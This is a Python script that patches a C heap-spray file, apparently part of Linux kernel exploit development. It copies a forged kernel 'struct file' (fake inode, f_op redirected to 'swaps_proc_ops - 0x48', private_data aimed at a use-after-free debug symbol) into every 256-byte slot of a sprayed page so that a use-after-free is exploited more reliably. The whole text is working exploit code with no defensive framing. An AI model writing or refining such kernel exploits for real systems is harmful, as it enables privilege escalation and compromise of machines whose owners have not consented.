with open("tier2/scripts/test_m7_spray.c", "r") as f:
    text = f.read()

old = """        for (int i = 0; i < 4096 / 8; i++) {
            ((uint64_t *)base)[i] = 0;
        }
        *(uint64_t *)(base + 32) = comm_addr - 0x40; // f_inode
        *(uint64_t *)(base + 40) = empty_zero_page;  // f_op
        *(uint64_t *)(base + 48) = 0; // f_lock
        *(uint64_t *)(base + 56) = 1; // f_count
        *(uint64_t *)(base + 68) = 0x20000; // f_mode CAN_READ
        *(uint64_t *)(base + 184) = 0; // f_version
        *(uint64_t *)(base + 208) = empty_zero_page; // f_ep
        // For the M5 dispatch:
        // swaps_proc_ops + 0x48 (poll offset) -> swaps_poll
        *(uint64_t *)(base + 40) = swaps_proc_ops - 0x48; 
        *(uint64_t *)(base + 200) = ep_dbg_uaf_detected - 0x60; // private_data"""

new = """        for (int i = 0; i < 4096 / 8; i++) {
            ((uint64_t *)base)[i] = 0;
        }
        // Fill every 256-byte slot in the 4KB page (16 slots)
        for (int slot = 0; slot < 4096; slot += 256) {
            uint64_t sbase = (uint64_t)base + slot;
            *(uint64_t *)(sbase + 32) = comm_addr - 0x40; // f_inode
            *(uint64_t *)(sbase + 48) = 0; // f_lock
            *(uint64_t *)(sbase + 56) = 1; // f_count
            *(uint64_t *)(sbase + 68) = 0x20000; // f_mode CAN_READ
            *(uint64_t *)(sbase + 184) = 0; // f_version
            *(uint64_t *)(sbase + 208) = empty_zero_page; // f_ep
            
            // Dispatch payload
            *(uint64_t *)(sbase + 40) = swaps_proc_ops - 0x48; 
            *(uint64_t *)(sbase + 200) = ep_dbg_uaf_detected - 0x60; // private_data
        }"""

text = text.replace(old, new)

with open("tier2/scripts/test_m7_spray.c", "w") as f:
    f.write(text)
